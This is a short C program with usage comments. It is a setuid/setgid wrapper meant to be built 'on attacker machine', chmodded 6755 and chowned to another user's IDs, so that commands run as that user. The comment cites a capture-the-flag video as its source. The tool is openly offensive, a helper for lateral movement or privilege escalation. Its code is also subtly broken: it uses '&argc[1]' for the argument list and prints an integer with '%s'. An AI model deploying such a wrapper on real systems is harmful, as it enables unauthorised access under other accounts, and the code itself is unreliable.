#include <stdio.h>
#include <unistd.h>

int main(int argc, const char * argv[]){
  if (argc > 1) printf("%s",execvp(argv[1], &argc[1]));
  return 0;
}

/*
Useful to execute commands as other users that are NOT root. because it assumes the effective user ID of a different non-root user.  This is explained in more detail at the end of the Ippsec Jail video.
On attacker machine before transfer:
	gcc SETUID_Cmd.c -o SETUID_Cmd
	chmod 6755 SETUID_Cmd
    4 (set UID) + 2 (set GID)
	Chown [UID]:[GID] SETUID_Cmd
		- Or whatever UID:GID we elevate to.
  ./SETUID_Cmd [command we want to execute as the effective UID GID that we changed the owner to]
*/
